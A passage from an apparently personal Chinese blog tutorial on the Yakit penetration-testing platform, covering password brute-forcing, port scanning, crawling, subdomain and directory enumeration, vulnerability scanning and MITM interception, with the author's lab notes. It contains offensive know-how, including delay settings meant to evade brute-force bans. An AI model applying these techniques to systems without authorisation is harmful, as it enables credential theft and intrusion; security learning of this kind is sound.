核心引擎</h2><p>1.1.6版本之后引擎下载方式为自动下载安装，通过安装包安装即可同时安装客户端和引擎，无需单独安装引擎。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-24%2009.28.23.png" style="zoom:40%;"><h2 id="2-3-界面初识"><a href="#2-3-界面初识" class="headerlink" title="2.3 界面初识"></a>2.3 界面初识</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-24%2009.34.16.png" style="zoom:35%;"><h2 id="2-4-本地模式vs远程模式"><a href="#2-4-本地模式vs远程模式" class="headerlink" title="2.4 本地模式vs远程模式"></a>2.4 本地模式vs远程模式</h2><p>由于 Yak 核心引擎与 Yakit 的分离式安装，Yakit 仅仅作为一个客户端而存在，Yakit 的使用理所当然就应该存在两种模式</p><ol><li><p>本地模式：默认启动一个随机端口的 <code>yak grpc</code> 服务器</p></li><li><p>远程模式：yak grpc 可以启动在任何平台 / 任何网络位置，包括</p><ul><li><p>远端托管主机 ECS/VPS</p></li><li><p>本地个人 PC</p></li><li><p>内网环境</p></li></ul></li></ol><p>与此同时，yak grpc 启动参数支持设置 <code>--tls</code> 与 <code>--secret</code> 以实现一些远程连接的安全需求。</p><p>同时 Yakit 既然作为客户端，在远程模式和本地模式下，除了网络延迟之外，其他的使用体验应该是完全一致的。</p><h1 id="三、爆破与未授权检测"><a href="#三、爆破与未授权检测" class="headerlink" title="三、爆破与未授权检测"></a>三、爆破与未授权检测</h1><h2 id="3-1-简介"><a href="#3-1-简介" class="headerlink" title="3.1 简介"></a>3.1 简介</h2><p>破和未授权检测是网络安全领域中一种常见的测试技术，其主要目的是测试系统或应用程序中的口令是否强健，Yakit的爆破与未授权检测模块则实现了该部分的内容。这个模块可以对多种常见协议和服务（如ftp、memcached、mongodb、mssql、mysql、postgres、rdp、redis、smb、ssh、tomcat、vnc等）进行口令的爆破，以验证系统的安全性。</p><p>该模块的基本工作原理是：利用字典和暴力破解等技术，不断尝试各种可能的口令，直到找到正确的口令为止。如果正确的口令被找到，那么爆破程序将立即停止，并返回成功的结果。如果在一定时间内没有找到正确的口令，那么爆破程序将返回失败的结果。</p><p>为了提高爆破效率和准确性，采用多线程和异步请求等技术，可以同时进行多个协议和服务的口令爆破，大大缩短了测试时间。同时，该模块还可以自动分析和识别协议和服务的版本信息，根据不同版本的特点，进行检测。</p><h2 id="3-2-参数设置"><a href="#3-2-参数设置" class="headerlink" title="3.2 参数设置"></a>3.2 参数设置</h2><p>点击更多参数可以进行字典的自定义配置以及并发和间隔时间等高级参数的设置。</p><p>关于参数的解释：</p><ul><li>爆破用户字典：可以选择上传在<code>Payload管理</code>的字典进行爆破</li><li>爆破用户：如需对字典内容进行补充，可以在这里进行输入 -</li><li>同时使用默认字典：如勾选则表示需要使用该功能内置的默认字典，不勾选则表示不使用。</li><li>爆破密码字典、爆破密码、同时使用默认字典意义同上</li><li>自动停止：遇到第一个爆破结果时是否终止任务</li><li>目标并发：同时可爆破的目标数，yak的爆破规则为同时爆破“多个目标”，每个目标低并发。这样在有多个目标的时候，并不会影响效率，而且单个目标也不会过快导致被封禁。</li><li>最小延迟，最大延迟：可理解为超时时间，单位为s，超过时间则不会继续进行爆破。一般来讲，如果要 ban 爆破行为的话，通常会设置一个时间窗口，短时间窗口被打满会认为发生了爆破事件。如果可以再“放缓” 针对单个目标的测试强度，其实有可能可以缓解这个问题，所以我们可以通过这种设置最小延迟和最大延迟来解决这个问题。</li></ul><h2 id="3-3-实验验证（EX）"><a href="#3-3-实验验证（EX）" class="headerlink" title="3.3 实验验证（EX）"></a>3.3 实验验证（EX）</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-24%2015.13.23.png" style="zoom:40%;"><h1 id="四、端口探测和指纹扫描"><a href="#四、端口探测和指纹扫描" class="headerlink" title="四、端口探测和指纹扫描"></a>四、端口探测和指纹扫描</h1><h2 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="4.1 概述"></a>4.1 概述</h2><h3 id="4-1-1-端口扫描"><a href="#4-1-1-端口扫描" class="headerlink" title="4.1.1 端口扫描"></a>4.1.1 端口扫描</h3><p>端口扫描和指纹识别是渗透测试和网络安全领域中常用的基础技术之一，用于评估目标系统的安全性和发现可能存在的漏洞和攻击面。也是Yakit基础工具的模块之一，本文将对<code>端口探测和指纹扫描模块</code>进行简单介绍。</p><p><strong>端口扫描</strong>是指通过扫描目标系统上的端口，确定哪些端口是开放的，并确定这些开放的端口上运行的服务类型和版本信息。</p><p>Yakit 使用的端口扫描的技术主要有以下几种：</p><ul><li>TCP SYN扫描：该技术利用TCP协议的三次握手过程中的SYN和ACK标志来判断端口的开放情况。扫描模块发送一个SYN标志的数据包给目标主机，如果目标主机回应了一个SYN/ACK数据包，就表明该端口是开放的。扫描模块随即发送一个RST数据包，以关闭连接。如果目标主机回应了一个RST/ACK数据包，表明该端口是关闭的。如果没有任何响应，表明该端口可能被防火墙或者入侵检测系统屏蔽了。</li><li>TCP Connect扫描：该技术利用TCP协议的三次握手过程来判断端口的开放情况。扫描模块向目标主机发起一个TCP连接请求，如果目标主机回应一个SYN/ACK数据包，表明该端口是开放的，扫描模块会回应一个ACK数据包，以建立连接。如果目标主机回应一个RST数据包，表明该端口是关闭的。如果没有任何响应，表明该端口可能被防火墙或者入侵检测系统屏蔽了。</li><li>UDP扫描：UDP协议没有像TCP协议一样的连接状态，因此UDP扫描更加复杂。扫描模块向目标主机发送一个UDP数据包，如果目标主机回应了一个ICMP端口不可达数据包，表明该端口是关闭的。如果没有任何响应，表明该端口可能是开放的。需要注意的是，由于UDP协议没有连接状态，因此UDP扫描的准确性比TCP扫描要低。</li></ul><h3 id="4-1-2-指纹识别"><a href="#4-1-2-指纹识别" class="headerlink" title="4.1.2 指纹识别"></a>4.1.2 指纹识别</h3><p><strong>指纹识别</strong>是通过对目标系统上的服务和应用程序进行识别，来确定目标系统上的操作系统、应用程序和服务信息。指纹识别技术主要通过解析网络数据包和应用程序响应消息来实现。</p><p>以下是常见的几种指纹识别技术及其原理：</p><ul><li>应用程序指纹识别：该技术通过解析应用程序的响应消息，来确定应用程序的类型和版本信息。例如，HTTP协议中的服务器响应头信息就包含了Web服务器的类型和版本信息。指纹识别器通过向目标系统发送HTTP请求，并解析响应消息中的服务器头信息，来确定Web服务器的类型和版本信息。</li><li>协议指纹识别：该技术通过解析网络数据包，来确定目标系统所使用的协议类型和版本信息。例如，通过解析TCP数据包的TCP标志位、TCP选项和窗口大小等信息，可以确定目标系统上的TCP/IP协议的版本信息。</li><li>操作系统指纹识别：该技术通过解析网络数据包中的特征信息，来确定目标系统所使用的操作系统类型和版本信息。例如，通过解析TCP数据包中的MSS、TTL、IP ID等信息，可以确定目标系统所使用的操作系统类型和版本信息。</li></ul><h2 id="4-2-用法"><a href="#4-2-用法" class="headerlink" title="4.2 用法"></a>4.2 用法</h2><ul><li>SYN扫描</li></ul><p>具有权限要求，Linux下启动yakit需要以root权限启动，windows下需要管理员权限启动，如果不是以root或者管理员权限启动会报错。</p><ul><li>指纹扫描</li></ul><p>无权限要求，可直接进行扫描，识别端口指纹.</p><ul><li>SYN+指纹扫描</li></ul><p>具有权限要求，Linux下启动yakit需要以root权限启动，windows下需要管理员权限启动，如果不是以root或者管理员权限启动会报错。</p><h2 id="4-3-实验验证（EX）"><a href="#4-3-实验验证（EX）" class="headerlink" title="4.3 实验验证（EX）"></a>4.3 实验验证（EX）</h2><p>实验验证：不如nmap好用。</p><p>我扫描的是mac上虚拟网卡bridge100上的192.168.155.34机子上开放端口和指纹的情况。一开始跳过主机存货检测的时候老是会报下面的错。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>WARN<span class="token punctuation">]</span> <span class="token number">2024</span>-12-24 <span class="token number">15</span>:07:45 <span class="token punctuation">[</span>grpc_http_request_debug:173<span class="token punctuation">]</span> execute debug script failed: <span class="token builtin class-name">exec</span> yakc with code failed: Panic Stack:__yak_main__<span class="token number">429</span> <span class="token operator">|</span>         synscan.concurrent<span class="token punctuation">(</span>synConcurrent<span class="token punctuation">)</span>, <span class="token number">430</span> <span class="token operator">|</span>         synscan.iface<span class="token punctuation">(</span>synScanNetInterface<span class="token punctuation">)</span>, <span class="token number">431</span> <span class="token operator">|</span>     <span class="token punctuation">)</span> <span class="token number">432</span> <span class="token operator">&gt;</span>     die<span class="token punctuation">(</span>err<span class="token punctuation">)</span>              ^~~~~ <span class="token number">433</span> <span class="token operator">|</span>  <span class="token number">434</span> <span class="token operator">|</span>     res, err :<span class="token operator">=</span> servicescan.ScanFromSynResult<span class="token punctuation">(</span>synResults, opts<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token number">435</span> <span class="token operator">|</span>     die<span class="token punctuation">(</span>err<span class="token punctuation">)</span>YakVM Panic: no valid <span class="token function">ping</span> results found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>单独进行syn扫描或指纹扫描的时候，识别的端口总是不全。</p><p>最后通过设置不跳过主机存活+syn+指纹扫描，得到了较为全面的结果。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2009.48.08.png" alt="截屏2024-12-25 09.48.08" style="zoom:50%;"><p>服务识别的情况并不好。</p><h1 id="五、基础爬虫"><a href="#五、基础爬虫" class="headerlink" title="五、基础爬虫"></a>五、基础爬虫</h1><h2 id="5-1-背景"><a href="#5-1-背景" class="headerlink" title="5.1 背景"></a>5.1 背景</h2><p>众所周知，爬虫是主动漏洞扫描中极其重要的一环。在漏洞扫描中，爬虫被用作一种数据收集工具，用于获取目标系统的信息以帮助我们发现漏洞。</p><p>Yakit 漏洞扫描中的<code>基础爬虫</code>通常包含以下三个主要步骤：</p><ul><li>网站爬取：爬虫首先会爬取目标系统中的网站，并将网站的源代码和相关信息存储到扫描器的数据库中。这些信息包括网站的URL、页面结构、表单、脚本和其他与网站相关的信息。</li><li>爬取数据分析：基础爬虫会对爬取的网站数据进行分析，并从中提取相关的信息，如网站的结构、链接、表单和参数等。</li><li>漏洞检测：基础爬虫会使用爬取到的信息根据加载的相关的Yakit插件进行漏洞扫描，并根据扫描结果提供相应的漏洞报告。</li></ul><p>需要注意的是，漏洞扫描中的爬虫与普通的爬虫有所不同。它并不是为了抓取网站上的数据而设计的，而是为了获取网站结构和参数等信息以帮助我们发现漏洞。同时，进行漏洞扫描时需要遵守相关的法律和道德规范，不能进行未经授权的攻击行为。</p><h2 id="5-2-其他参数"><a href="#5-2-其他参数" class="headerlink" title="5.2 其他参数"></a>5.2 其他参数</h2><ul><li>设置代理：有些网站访问不到的，可以加入代理进行访问，格式为<a href="http://127.0.0.1:7890/">http://127.0.0.1:7890</a> 或者 socks5://127.0.0.1:7890</li><li>超时时间：每个请求的最大超时时间</li><li>最大深度：设置爬虫的最大深度（逻辑深度，并不是级数）</li><li>并发量：爬虫的并发请求量（可以理解为线程数）</li><li>最大URL数：爬虫获取到的最大量URL（这个选项一般用来限制无限制的爬虫，一般不需要改动）</li><li>最大请求数：本次爬虫最多发出多少个请求？（一般用于限制爬虫行为，一般不需要改动）</li></ul><h2 id="5-3-实验验证（EX）"><a href="#5-3-实验验证（EX）" class="headerlink" title="5.3 实验验证（EX）"></a>5.3 实验验证（EX）</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.02.53.png" style="zoom:50%;"><p>  login.html都没有爬到，效果不是很好。</p><h1 id="六、空间引擎：Hunter"><a href="#六、空间引擎：Hunter" class="headerlink" title="六、空间引擎：Hunter"></a>六、空间引擎：Hunter</h1><h2 id="6-1-概述"><a href="#6-1-概述" class="headerlink" title="6.1 概述"></a>6.1 概述</h2><p>网络空间搜索引擎是一种专门用于在网络上发现和分析特定信息的搜索引擎，也是渗透测试中信息收集的方式之一。</p><p>与传统搜索引擎不同，网络空间搜索引擎的目标是搜索网络上的非常规资源，例如网络服务器、端口、IP地址、文件、目录、数据库等等。它可以帮助企业、政府机构、安全团队等进行网络情报收集和威胁情报分析。</p><p>除了hunter外，还有很多同类型的空间搜索引擎，在Yakit插件商店中也有类似的插件。</p><h2 id="6-2-使用"><a href="#6-2-使用" class="headerlink" title="6.2 使用"></a>6.2 使用</h2><p>通过配置hunter的apiKey和用户名并输入hunter语法来获取目标资产，并且左边提供poc插件进行批量检测。</p><h2 id="6-3-实验验证（EX）"><a href="#6-3-实验验证（EX）" class="headerlink" title="6.3 实验验证（EX）"></a>6.3 实验验证（EX）</h2><p>缺少空间引擎的apikey，暂未做实验验证。</p><h1 id="七、子域名收集"><a href="#七、子域名收集" class="headerlink" title="七、子域名收集"></a>七、子域名收集</h1><h2 id="7-1-背景"><a href="#7-1-背景" class="headerlink" title="7.1 背景"></a>7.1 背景</h2><p>子域名收集是指通过各种技术手段，收集某个主域名下所有的子域名列表。子域名是指在主域名前面添加一级或多级名称的域名。例如，对于主域名example.com，其子域名可以是<a href="http://www.example.com、mail.example.com、blog.example.com/">www.example.com、mail.example.com、blog.example.com</a> 等等。</p><p>子域名收集的原理主要涉及以下几个方面：</p><ul><li>域名解析：域名解析是将域名解析为对应IP地址的过程。在子域名收集过程中，可以通过查询主域名的DNS记录来获取其下的子域名列表。通过递归查询，可以获取主域名下所有的子域名。</li><li>模糊匹配：对于一些主域名，可能会存在一些常见的子域名，例如www、mail、ftp等等。通过在主域名前面添加这些常见的子域名，可以得到可能存在的子域名列表。例如，对于主域名example.com，可以尝试查询<a href="http://www.example.com、mail.example.com/">www.example.com、mail.example.com</a> 等等。</li><li>爆破技术：爆破技术是指利用程序自动化的方式，对域名进行大量的猜测和尝试，以获取其下的子域名列表。例如，可以使用字典文件对主域名进行爆破，尝试各种可能存在的子域名。</li><li>搜索引擎：通过搜索引擎的方式，可以搜索到主域名下可能存在的子域名。例如，可以使用搜索引擎的“site:example.com”命令来搜索所有以example.com结尾的子域名。</li></ul><h2 id="7-2-使用方法"><a href="#7-2-使用方法" class="headerlink" title="7.2 使用方法"></a>7.2 使用方法</h2><p>在输入框输入要测试的目标的根域名，然后点击执行即可开始爆破，爆破的结果会在下方展示，也会在数据库入库。</p><h2 id="7-3-实验验证（EX）"><a href="#7-3-实验验证（EX）" class="headerlink" title="7.3 实验验证（EX）"></a>7.3 实验验证（EX）</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.14.06.png" style="zoom:50%;"><h1 id="八、综合目录扫描与爆破"><a href="#八、综合目录扫描与爆破" class="headerlink" title="八、综合目录扫描与爆破"></a>八、综合目录扫描与爆破</h1><h2 id="8-1-背景"><a href="#8-1-背景" class="headerlink" title="8.1 背景"></a>8.1 背景</h2><p>目录扫描是一种常用的Web应用程序安全测试技术，用于发现Web应用程序中存在的可能存在的漏洞和弱点。其原理是通过对Web应用程序中的目录和文件进行遍历，来发现可能存在的安全漏洞和风险。</p><p>具体来说，目录扫描工具会通过程序自动化的方式，生成大量的HTTP请求，并请求Web应用程序中的所有可能存在的目录和文件。当Web应用程序返回200状态码时，表示该目录或文件存在；当Web应用程序返回404状态码时，表示该目录或文件不存在。通过对Web应用程序返回的状态码进行分析，目录扫描工具可以确定哪些目录或文件是存在的，哪些是不存在的。</p><p>在目录扫描过程中，目录扫描通常会使用字典文件，Yakit内置了一些常见字典，这些字典文件包含了一些常见的目录和文件路径，用于帮助目录扫描工具生成HTTP请求。此外，还可以通过调整线程的方式，同时发送多个HTTP请求，加快扫描速度。</p><p>需要注意的是，目录扫描工具的扫描结果并不一定是准确的，因为Web应用程序可能存在某些安全机制来防止目录扫描工具的攻击，例如IP封锁、User-Agent过滤等。因此，在使用目录扫描工具进行安全测试时，需要结合其他的测试技术，如手工测试、漏洞扫描等，以确保测试的全面性和准确性。</p><h2 id="8-2-使用方法"><a href="#8-2-使用方法" class="headerlink" title="8.2 使用方法"></a>8.2 使用方法</h2><p>点击<code>检查项目</code>文本框，选择想要使用的字典，在文本框输入目标后，点击<code>开始执行</code>即可针对文件以及网站目录进行扫描爆破。</p><p>支持的文件或文件类型有：.sql、.bak、.zip、.rar、admin.sql、backup.zip、web.rar，单次扫描结果可在页面下方进行展示。</p><h2 id="8-3-实验验证（EX）"><a href="#8-3-实验验证（EX）" class="headerlink" title="8.3 实验验证（EX）"></a>8.3 实验验证（EX）</h2><p>后续搭建靶场进行测试。</p><h1 id="九、专项漏洞测试"><a href="#九、专项漏洞测试" class="headerlink" title="九、专项漏洞测试"></a>九、专项漏洞测试</h1><h2 id="9-1-背景"><a href="#9-1-背景" class="headerlink" title="9.1 背景"></a>9.1 背景</h2><p>专项漏洞检测是针对特定应用程序或系统进行的安全漏洞扫描技术，旨在检测与该应用程序或系统相关的安全漏洞。</p><p>Yakit通过对常见的中间件、CMS、框架、组件进行总结、归纳，并针对这些组件对其常见的高危漏洞进行了整理。</p><p>通过预制漏洞源码，对可以对某类特定目标进行专项的漏洞检测，可以自定义新增poc种类。</p><h2 id="9-2-使用方法"><a href="#9-2-使用方法" class="headerlink" title="9.2 使用方法"></a>9.2 使用方法</h2><p>首先点击左上角的下拉菜单，选择自己想要检测的组件，选择完成后在右侧文本框中输入想要检测的目标点击执行任务即可开始扫描。</p><p>单次扫描的结果可以在<code>命中风险与漏洞</code>中查看。</p><p>若要进行批量的检测，点击<code>额外配置</code>然后<code>点击此处</code>上传文本文件</p><h2 id="9-3-实验验证（EX）"><a href="#9-3-实验验证（EX）" class="headerlink" title="9.3 实验验证（EX）"></a>9.3 实验验证（EX）</h2><p>后续研究具体漏洞时进行相应的实验验证。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.25.02.png" style="zoom:50%;"><h1 id="十、自动化漏洞检测"><a href="#十、自动化漏洞检测" class="headerlink" title="十、自动化漏洞检测"></a>十、自动化漏洞检测</h1><h2 id="10-1-背景"><a href="#10-1-背景" class="headerlink" title="10.1 背景"></a>10.1 背景</h2><p>渗透测试是一种通过模拟黑客攻击的方式，通常情况下一般会包括以下步骤：</p><ul><li>信息收集：通过搜索引擎、whois查询、子域名枚举、网络拓扑分析等方式，收集目标系统的基础信息，如IP地址、域名、主机名、操作系统、服务等。</li><li>端口扫描：使用端口扫描工具，扫描目标系统的开放端口，确定哪些端口是开放的，以及哪些服务运行在这些端口上。</li><li>漏洞探测：使用漏洞扫描工具，对目标系统进行漏洞扫描，探测目标系统是否存在已知漏洞或弱点。</li><li>漏洞验证：对扫描工具发现的漏洞进行验证，确认漏洞是否真实存在、是否可利用，以及漏洞对系统的影响程度。</li></ul><p>在具体实践中，信息收集和端口扫描通常是漏洞检测的第一步，以便对目标系统的结构和组件有一个大体的了解。接下来，漏洞探测和漏洞验证则是确定目标系统是否存在安全漏洞的关键步骤。</p><p>漏洞检测是一项复杂的任务，需要根据目标系统的特点和安全需求，综合选择适当的工具和技术进行测试，以尽可能全面地发现系统中存在的安全漏洞和风险。</p><p>Yakit中的基础工具，涵盖了渗透测试的全流程，本章节是对Yakit自动化渗透的探索，旨在自动化完成从信息收集、端口扫描、漏洞探测、漏洞验证的全过程。比如主机服务检测、WEB服务检测、漏洞检测、弱口令检测等场景的组合利用。</p><p>下面以信息收集、端口扫描、漏洞探测、漏洞验证的全过程为例，进行使用的说明。</p><h2 id="10-2-使用方法"><a href="#10-2-使用方法" class="headerlink" title="10.2 使用方法"></a>10.2 使用方法</h2><p>首先，打开<code>基础工具</code>–<code>端口/指纹扫描</code> 在左侧的插件处勾选各个过程所需要的插件，然后在文本框输入想要扫描的目标，</p><p>在各个插件的参数配制处根据自己的需求进行调整，然后点击执行任务进开始扫描。</p><p>每个插件扫描的结果会在对应的下方的展示栏处进行展示，可根据需求进行查看。</p><p>针对扫描IP数量多少可以做一些更多参数高级配置。</p><ul><li>扫描模式选择</li></ul><p>服务器IP数量少，我们就选择指纹扫描，这个相对来说要准确一点，但是速度要慢一点，服务器IP数据量多，我们就选择SYN扫描 或者 SYN+指纹扫描，速度较快。</p><p>主动发包超时时间设置：如果左侧选择的插件少 我们就设置5-7 如果左侧选择的插件多 我们就设置1-3</p><p>其他配置：根据详情实际情况而定，一般默认无需修改。</p><ul><li>插件批量执行模块</li></ul><p>该模块旨在自动化对URL进行扫描识别即漏洞检测。点击<code>插件</code>-选择<code>插件批量执行</code>–<code>输入目标</code>–<code>执行任务</code>即可。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.30.43.png" style="zoom:50%;"><p>注意额外配置扫描超时 默认设置2小时 7200 可以根据扫描网站数量而定设置3600都可以，并且可以设置代理等操作。</p><p>扫描到一半点击“结束”，进行中断的任务，可在未完成中选择任务继续执行。</p><h1 id="十一、MITM中间人代理与劫持"><a href="#十一、MITM中间人代理与劫持" class="headerlink" title="十一、MITM中间人代理与劫持"></a>十一、MITM中间人代理与劫持</h1><h2 id="11-1-中间人攻击简介"><a href="#11-1-中间人攻击简介" class="headerlink" title="11.1 中间人攻击简介"></a>11.1 中间人攻击简介</h2><p>“MITM” 是 “Man-in-the-Middle” 的缩写，意思是中间人攻击。</p><p>MITM攻击是一种网络攻击技术，攻击者通过欺骗的手段，让自己成为通信双方之间的中间人，从而可以窃取双方之间的通信内容、修改通信内容、甚至篡改通信流量，从而实现窃取信息、伪造信息等攻击目的。</p><p>在渗透测试中，MITM劫持可以被用来模拟真实的黑客攻击，以测试系统和应用程序的安全性。</p><p>渗透测试中使用MITM攻击的一个典型场景是在测试Web应用程序时。攻击者可以使用MITM技术拦截应用程序和服务器之间的通信，以获取用户名和密码等敏感信息，或者篡改应用程序返回的数据。攻击者可以使用代理工具，来捕获应用程序发送和接收的数据，对数据进行修改或篡改，然后重新发送到应用程序或服务器。这样就可以测试应用程序是否可以有效地防范MITM攻击，并且是否能够正确地处理应用程序和服务器之间的通信。</p><p>MITM攻击还可以用来测试网络的弱点，并检测是否存在潜在的漏洞。通过MITM攻击，渗透测试人员可以捕获网络中传输的数据，并进行分析和审查，以发现可能存在的安全问题。</p><p>例如，攻击者可以利用MITM攻击来欺骗局域网内的设备，并拦截设备之间的通信流量，从而窃取敏感信息，或者篡改数据包，对网络进行进一步的攻击。</p><p>总的来说，MITM劫持是渗透测试中常用的一种技术，它可以帮助测试人员发现网络中可能存在的安全漏洞，提供相应的建议和解决方案，从而保护系统和应用程序的安全。</p><h2 id="11-2-MITM-交互式劫持技术"><a href="#11-2-MITM-交互式劫持技术" class="headerlink" title="11.2 MITM 交互式劫持技术"></a>11.2 MITM 交互式劫持技术</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.55.27.png" alt="YakMITM劫持原理示意图" style="zoom:50%;"><p>Yakit的MITM模块原理是启动一个HTTP代理，自动转发流量，当用户启动手动劫持后，会停止自动转发，阻塞请求，并将请求出栈，做解压Gzip、处理chunk、解码等处理，让请求变得人类可读，并显示在用户前端，用户可以对请求做查看、修改或重放。</p><p>重放时，会对用户构造的HTTP请求数据包做修复，保证请求包的有效性。Yak引擎手动实现了HTTP库，所以用户可以自定义畸形的请求包、响应包，应用于一些特殊场景下的漏洞利用。</p><p>MITM操作台可百分百替代 BurpSuite，下载并安装证书、劫持请求、响应、编辑劫持到的数据包等。</p><p>并且提供一整套顺畅的工作流，劫持 =&gt; History =&gt; Repeater / Intruder，劫持到的数据，在History可以查看历史数据，选择需要“挖掘”的数据包，发送到 WebFuzzer 进行 Repeater / Intruder 操作。</p><p>除了这些典型的操作场景外，MITM 还提供了插件被动扫描、热加载、数据包替换、标记等更灵活的功能。</p><h2 id="11-3-免配置模式"><a href="#11-3-免配置模式" class="headerlink" title="11.3 免配置模式"></a>11.3 免配置模式</h2><p>使用免配置模式。不需要任何其他配置，只需安装Chrome 浏览器，免配置启动之后将打开一个新的浏览器会话，其中所有流量都将通过 Yakit 自动代理。无需安装 Yakit 的 CA 证书就可以使用它来通过 HTTPS 进行测试。</p><p>点击<code>渗透测试</code>–<code>MITM交互式劫持</code>即可进入MITM劫持页面，点击<code>免配置启动</code>进入免配置启动设置界面。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.04.49.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.09.40.png" style="zoom:50%;"><p>配置代理处默认为：<a href="http://127.0.0.1:8083/">http://127.0.0.1:8083</a> 默认配置代理无需修改，点击<code>启动免配置Chrome</code> 默认启动谷歌浏览器，即开始劫持抓包，点击图中④的<code>免配置启动</code>即可关闭代理。</p><h2 id="11-4-安装证书启动MITM劫持"><a href="#11-4-安装证书启动MITM劫持" class="headerlink" title="11.4 安装证书启动MITM劫持"></a>11.4 安装证书启动MITM劫持</h2><p>使用、选择的外部浏览器。由于各种原因，可能不想使用免配置的代理的浏览器。在这种情况下，需要执行一些其他步骤来配置浏览器以与 Yakit的 MITM 一起使用，并在浏览器中安装 Yakit 的 CA 证书。</p><p>HTTPS协议是一种安全的HTTP协议，通过SSL/TLS协议来实现通信的加密和身份验证，可以有效地防止MITM攻击。</p><p>然而，虽然HTTPS协议可以保证通信的安全性，但在使用代理服务器等中间设备时，也会存在MITM攻击的风险。</p><p>这是因为代理服务器需要对HTTPS连接进行解密和再加密，从而中断原本的端到端加密，攻击者就有可能利用这个中断点进行MITM攻击。</p><p>为了解决这个问题，HTTPS协议中引入了一种称为证书锁定（Certificate Pinning）的机制。通过证书锁定，客户端可以预先保存目标服务器的SSL证书信息，并在与服务器通信时，检查服务器返回的证书是否与预期一致，从而避免代理服务器进行恶意的证书篡改和中间人攻击。</p><p>因此，为了实现中间人的角色，代理服务器需要自己生成一个SSL证书，并将其安装在客户端上，让客户端相信这个证书是有效的。</p><p>这个证书需要被客户端所信任，否则客户端会出现警告提示，这就需要在客户端上安装代理服务器生成的证书并进行信任设置。</p><p>因此基于HTTPS协议这些特性，我们在使用代理时，需要安装Yakit CA 证书，才能拦截HTTPS的消息。</p><h3 id="11-4-1-CA证书的安装"><a href="#11-4-1-CA证书的安装" class="headerlink" title="11.4.1 CA证书的安装"></a>11.4.1 CA证书的安装</h3><p>关于证书的安装(以windows为例)，主要有以下步骤：</p><ol><li><p>首先，需要我们根据图中所示配置好代理的监听端口和浏览器的代理服务器设置，然后点击③<code>高级配置</code>并下载证书。</p><p>*<strong>注：关于浏览器的代理服务器设置的详细内容将在下一章节（代理和浏览器配置）中进行介绍。*</strong></p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.13.47.png" style="zoom:50%;"></li><li><p>点击下图所示的<code>证书下载</code>,或者在设置代理后访问：<a href="http://download-mitm-cert.yaklang.io/">http://download-mitm-cert.yaklang.io</a> 进行下载，另存为到本地目录。</p></li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.14.30.png" style="zoom:50%;"><ol start="3"><li>修改下载证书的后缀，去掉“.pem”，双击进行安装，证书存储选择 ‘受信任的根证书颁发机构’</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.15.07.png" style="zoom:40%;"><blockquote><p>CRT和PEM是两种常见的数字证书格式，用于加密和验证通信过程中的数据安全。</p><p>CRT是一个X.509证书文件格式，PEM是一种可打印的证书文件格式，可以包含多种类型的加密和公钥证书。PEM格式通常使用base64编码，并且以“—–BEGIN CERTIFICATE—–”和“—–END CERTIFICATE—–”之间的文本块包含证书数据。PEM格式还可以用于存储密钥、证书请求和其他类型的加密数据。CRT格式是一种二进制格式，包含用于验证数字证书有效性的公钥、证书持有者的信息以及证书签名。CRT格式通常用于安装数字证书到Web服务器或其他应用程序中。在实践中，PEM格式比CRT格式更为常见，因为PEM格式的文件可以轻松地通过文本编辑器进行查看和编辑，并且PEM格式也可以包含多种类型的加密和公钥证书。不过，在某些情况下，例如在安装数字证书到Web服务器上时，CRT格式可能更为方便。</p></blockquote><p>至此，我们已经完成Yakit-MITM证书的安装，在Yakit中可以对HTTPS请求进行抓包。</p><h3 id="11-4-2-CA证书的卸载"><a href="#11-4-2-CA证书的卸载" class="headerlink" title="11.4.2 CA证书的卸载"></a>11.4.2 CA证书的卸载</h3><ul><li>第一种方式:以谷歌浏览器为例：打开谷歌浏览器→打开右上角更多选项卡→<code>设置</code>→<code>隐私设置和安全性</code>→<code>管理设备证书</code>→<code>受信任的根证书颁发机构</code> 选择证书然后点击删除</li></ul><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.17.30.png" 